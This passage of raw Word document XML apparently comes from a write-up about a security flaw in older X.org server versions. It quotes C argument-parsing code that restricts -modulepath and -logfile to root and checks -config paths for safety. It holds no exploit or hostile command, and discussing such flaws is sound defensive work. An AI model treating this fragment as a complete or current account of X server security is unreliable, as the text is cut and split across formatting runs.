          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4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law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was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di</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cove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en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>urr</w:t>
      </w:r>
      <w:r>
        <w:rPr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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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ve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sion</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-8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-1"/>
          <w:w w:val="92"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">g </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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ver 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proofErr w:type="gramEnd"/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11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6.9.0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1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7.0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C).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2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r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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ev</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a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pacing w:val="-3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o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tion</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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our</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ce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proofErr w:type="gramEnd"/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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d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d.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4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issu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="7" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="10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ddxProcessArgument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argc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**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/*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position w:val="1"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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Note:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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can’t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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use</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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position w:val="1"/>
        </w:rPr>
        <w:t>xalloc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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color w:val="008000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>xfree</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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because</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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position w:val="1"/>
        </w:rPr>
        <w:t>OsInit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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position w:val="1"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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hasn’t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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called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position w:val="1"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="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position w:val="1"/>
        </w:rPr>
        <w:t>yet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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Use</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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position w:val="1"/>
        </w:rPr>
        <w:t>malloc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>/free</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00800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instead.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*/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position w:val="1"/>
        </w:rPr>
        <w:t>#define</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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CHECK_FOR_REQUIRED_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>ARGUMENT()</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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(((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1)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&gt;=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argc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||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pacing w:val="-1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1]))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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ErrorF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  <w:position w:val="1"/>
        </w:rPr>
        <w:t>"Required</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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argument</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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to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%s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not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specifie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A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>\n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>,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]);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UseMsg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gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1" w:line="200" w:lineRule="exact"/>
        <w:ind w:left="154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FatalError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  <w:position w:val="1"/>
        </w:rPr>
        <w:t>"Required</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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argument</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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to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%s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not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specifie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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>\n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-16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]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6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/*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-2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First</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-6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the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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options</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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only</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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allowed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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*/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getuid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()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00000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||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geteuid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!=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0)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(!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],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000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"-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modulepath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))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1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before="1"/>
        <w:ind w:left="2264" w:right="48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char</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>mp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>; CHECK_FOR_REQUIRED_ARG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>MENT();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="226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mp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/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malloc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strlen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  <w:spacing w:val="-2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1])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1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="226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(!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mp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)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="29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FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="1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  <w:position w:val="1"/>
        </w:rPr>
        <w:t>"Can’t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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allocate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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memory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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for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ModulePat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h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\n"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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="2264" w:right="506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strcpy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mp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r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1]); xf86ModulePath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mp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>; xf86ModPathFrom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X_CMDLINE; </w:t>
      </w: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1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else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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logfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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000000"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="9"/>
        <w:ind w:left="2264" w:right="4821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char</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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*lf; CHECK_FOR_REQUIRED_ARGUMENT();</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="226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lf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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malloc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strlen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position w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-2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1])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1);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="226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(!lf)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="29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FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="1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  <w:position w:val="1"/>
        </w:rPr>
        <w:t>"Can’t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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allocate</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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memory</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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for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LogFil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e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\n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);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="2264" w:right="5061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strcpy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lf,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1]); xf86LogFile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lf; xf86LogFileFrom</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-18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X_CMDLINE; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r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1"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7"/>
        <w:ind w:left="1544" w:right="86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else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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if</w:t>
      </w:r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modulepath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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||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19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logfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1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>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>FatalError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A21515"/>
        </w:rPr>
        <w:t>"The</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-18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’%s’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option</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-7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can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only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be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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used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by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-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root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\n"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1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]);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(!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],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2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"-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config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||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!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],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-19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"-xf86config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"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6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CHECK_FOR_REQUIRED_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>ARGUMENT(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>);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getuid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()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00000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!=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&amp;&amp;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!xf86PathIsSafe(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pacing w:val="-2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+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1]))</w:t>
      </w:r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before="1"/>
        <w:ind w:left="2229" w:right="3620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FatalError</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing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</w:rPr>
        <w:t>"\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>nInvalid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-2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argument</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-1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for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  <w:w w:val="99"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:w w:val="99"/>
        </w:rPr>
        <w:t>\n"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="298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21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>"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\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tFor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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non-root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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users,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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the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file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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specified</w:t>
      </w:r>
      <w:r>
        <w:rPr>
